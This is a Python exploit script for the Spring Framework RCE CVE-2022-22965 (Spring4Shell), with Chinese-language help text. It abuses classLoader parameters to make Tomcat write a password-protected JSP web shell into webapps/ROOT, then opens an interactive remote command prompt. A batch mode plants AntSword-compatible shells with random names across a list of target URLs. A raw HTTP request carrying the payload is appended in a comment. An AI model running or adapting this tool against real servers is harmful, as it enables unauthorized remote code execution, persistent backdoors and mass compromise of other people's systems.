import random
import re,sys,argparse
import string
from colorama import Fore,init
from urllib.parse import urlparse
import requests
from urllib.parse import quote
from tqdm import tqdm
import urllib3
urllib3.disable_warnings()


def title():
    print(Fore.YELLOW + """
 .----..-.-. .---. .-..-. .-..----.     .----. .---. .---. .----.     .---. .----..----. 
{ {__-`| } }}} }}_}{ ||  \{ || |--' ___ | }`-'/ {-. \} }}_}} |__} ___ } }}_}| }`-'} |__} 
.-._} }| |-' | } \ | }| }\  {| }-`}{___}| },-.\ '-} /| } \ } '__}{___}| } \ | },-.} '__} 
`----' `-'   `-'-' `-'`-' `-'`----'     `----' `---' `-'-' `----'     `-'-' `----'`----'                                                                                        
""")
    print(Fore.YELLOW + '\t\t\t\t\t Spring framework Core RCE CVE-2022-22965\r\n' + '\t\t\t\t\t\t\t\t  ' + Fore.LIGHTBLUE_EX + 'By:K3rwin')  


def get_args():
    parser = argparse.ArgumentParser(description="Spring framework Core 0day RCE 帮助指南")
    parser.add_argument("-u", "--url", dest="url", type=str, help="指定url", default='')
    parser.add_argument("-s", "--system", dest="system", type=str, help="指定目标主机操作系统,默认linux,参数为win/linux", default='linux')
    parser.add_argument("-r", "--file", dest="file", type=str, help="指定url文件，批量写马", default='')
    args = parser.parse_args()
    url = args.url
    system = args.system
    file = args.file
    if url:
        url = urlparse(url)
        url = url.scheme + '://' + url.netloc
    return url,system,file


def exp(url, system):
    Headers_1 = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36",
    "suffix": "%>//",
    "c1": "Runtime",
    "c2": "<%",
    "DNT": "1",
    "Content-Type": "application/x-www-form-urlencoded"
    }
    payload_linux = """class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22k3rwin%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(new String[]{%22bash%22,%22-c%22,request.getParameter(%22cmd%22)}).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=shell&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="""
    payload_win = """class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22k3rwin%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(new String[]{%22cmd%22,%22/c%22,request.getParameter(%22cmd%22)}).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=shell&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="""
    if system == ("linux" or  "win"):
        if system == "linux":
            data = payload_linux
        else:
            data = payload_win
    else:
        print("system参数必须为win or linux，参数接收错误！")
        exit()
    try:
        requests.post(url, headers=Headers_1, data=data, timeout=5, allow_redirects=False, verify=False)
        test = requests.get(url + "/shell.jsp?pwd=k3rwin&cmd=whoami")
        if test.status_code == 200:
            print(Fore.GREEN + "[+]Spring框架存在RCE漏洞，上传木马地址为：" + url +"/shell.jsp?pwd=k3rwin&cmd=whoami")
            while 1:
                cmd = input("[+]输入执行的命令>>> ")
                url_shell = url + "/shell.jsp?pwd=k3rwin&cmd=%s" % quote(cmd)
                r = requests.get(url_shell) 
                resp = r.text
                result = re.findall('([^\x00]+)\n', resp)[0]
                print(Fore.GREEN + result)
        else:
            print(Fore.RED + "[-]" + url + " 漏洞不存在或者已经被利用,shell地址自行扫描\n")
    except KeyboardInterrupt:
        print("ctrl + c 终止进程")
    except Exception as e:
        print(Fore.RED + "程序异常")
        print(e)


def exps(file):
    Headers_2 = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36",
    "e1": "<%",
    "e2": "%>",
    "DNT": "1",
    "Content-Type": "application/x-www-form-urlencoded"
    }
    shell_name = ''.join(random.sample(string.ascii_letters + string.digits, 8))
    payload_antsword = """class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Be1%7Di!%20class%20U%20extends%20ClassLoader%20%7BU(ClassLoader%20c)%20%7Bsuper(c)%3B%7Dpublic%20Class%20g(byte%5B%5D%20b)%20%7Breturn%20super.defineClass(b%2C%200%2C%20b.length)%3B%7D%7Dpublic%20byte%5B%5D%20base64Decode(String%20str)%20throws%20Exception%20%7Btry%20%7BClass%20clazz%20%3D%20Class.forName(%22sun.misc.BASE64Decoder%22)%3Breturn%20(byte%5B%5D)%20clazz.getMethod(%22decodeBuffer%22%2C%20String.class).invoke(clazz.newInstance()%2C%20str)%3B%7D%20catch%20(Exception%20e)%20%7B%20Class%20clazz%20%3D%20Class.forName(%22java.util.Base64%22)%3BObject%20decoder%20%3D%20clazz.getMethod(%22getDecoder%22).invoke(null)%3Breturn%20(byte%5B%5D)%20decoder.getClass().getMethod(%22decode%22%2C%20String.class).invoke(decoder%2C%20str)%3B%7D%7D%20%25%7Be2%7Di%20%25%7Be1%7DiString%20cls%20%3D%20request.getParameter(%22k3rwin%22)%3Bif%20(cls%20!%3D%20null)%20%7Bnew%20U(this.getClass().getClassLoader()).g(base64Decode(cls)).newInstance().equals(pageContext)%3B%7D%20%25%7Be2%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix={}&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=""".format(shell_name)

    with open(file, "r") as f1,open("result.txt" ,"w") as f2:
        urls = f1.readlines()
        for url in tqdm(urls):
            url = url.strip().split('\n')[0]
            url = urlparse(url)
            url = url.scheme + '://' + url.netloc
            try:
                requests.post(url, headers=Headers_2, data=payload_antsword, timeout=5, allow_redirects=False, verify=False)
                test = requests.get(url + "/{}.jsp".format(shell_name))
                if test.status_code == 200:
                    f2.write("[+]Spring框架存在RCE漏洞，上传木马地址为：" + url + "/{}.jsp".format(shell_name) + " 使用蚁剑进行连接，密码为k3rwin\n")
                else:
                    f2.write("[-]" + url + " 漏洞不存在或者已经被利用，shell地址自行扫描\n")
            except Exception as e:
                print(e)
        print(Fore.GREEN + "[*]批量测试结果保存在当前目录下的result.txt文件内")
            

if __name__=="__main__":
    if len(sys.argv) > 1:
        init(autoreset=True)
        title()
        url, system,file = get_args()
        if file:
            exps(file)
        else:
            exp(url, system)
    else:
        print("使用python3 spring-core-rce.py -h 查看详细帮助")



'''
bp payload
POST / HTTP/1.1
Host: 192.168.50.111:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0
e1: <%
e2: %>
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
Content-Type: application/x-www-form-urlencoded
Content-Length: 1386

class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Be1%7Di!%20class%20U%20extends%20ClassLoader%20%7BU(ClassLoader%20c)%20%7Bsuper(c)%3B%7Dpublic%20Class%20g(byte%5B%5D%20b)%20%7Breturn%20super.defineClass(b%2C%200%2C%20b.length)%3B%7D%7Dpublic%20byte%5B%5D%20base64Decode(String%20str)%20throws%20Exception%20%7Btry%20%7BClass%20clazz%20%3D%20Class.forName(%22sun.misc.BASE64Decoder%22)%3Breturn%20(byte%5B%5D)%20clazz.getMethod(%22decodeBuffer%22%2C%20String.class).invoke(clazz.newInstance()%2C%20str)%3B%7D%20catch%20(Exception%20e)%20%7B%20Class%20clazz%20%3D%20Class.forName(%22java.util.Base64%22)%3BObject%20decoder%20%3D%20clazz.getMethod(%22getDecoder%22).invoke(null)%3Breturn%20(byte%5B%5D)%20decoder.getClass().getMethod(%22decode%22%2C%20String.class).invoke(decoder%2C%20str)%3B%7D%7D%20%25%7Be2%7Di%20%25%7Be1%7DiString%20cls%20%3D%20request.getParameter(%22passwd%22)%3Bif%20(cls%20!%3D%20null)%20%7Bnew%20U(this.getClass().getClassLoader()).g(base64Decode(cls)).newInstance().equals(pageContext)%3B%7D%20%25%7Be2%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=shell&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=
'''